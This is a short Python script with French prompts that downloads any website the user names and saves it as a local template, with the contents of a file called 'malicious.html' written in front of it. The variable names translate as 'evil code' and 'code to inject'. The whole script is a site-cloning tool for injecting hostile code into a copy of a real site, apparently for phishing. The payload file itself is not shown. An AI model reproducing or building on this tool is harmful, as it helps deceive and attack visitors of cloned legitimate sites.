import requests
input_user = input("Merci de saisir l'URL du site que vous souhaitez copier :\n")
rq = requests.get(input_user).text
with open("templates/index.html", "wb") as file:
    with open("malicious.html", "rb") as code_mechant:
        code_injecter = code_mechant.read()
    file.write(code_injecter)
    file.write(rq.encode("utf-8"))